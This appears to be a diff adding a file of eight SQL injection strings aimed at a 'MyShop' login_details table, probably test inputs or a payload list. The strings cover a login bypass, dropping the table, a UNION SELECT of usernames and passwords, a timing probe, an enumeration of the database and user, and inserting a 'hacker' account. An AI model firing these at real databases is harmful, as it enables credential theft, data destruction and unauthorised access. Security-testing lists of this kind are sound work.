@@ -1,0 +1,8 @@
+' OR 1=1; -- 
+MyShop; DROP TABLE login_details; --
+MyShop" UNION SELECT username, password FROM login_details; --
+test' OR EXISTS(SELECT 1 FROM login_details); -- 
+test' UNION SELECT database(), user(); -- 
+test'; WAITFOR DELAY '0:0:10'; -- 
+'); DROP TABLE login_details; -- 
+', 100, 0); INSERT INTO login_details VALUES ('hacker','pass123'); -- 
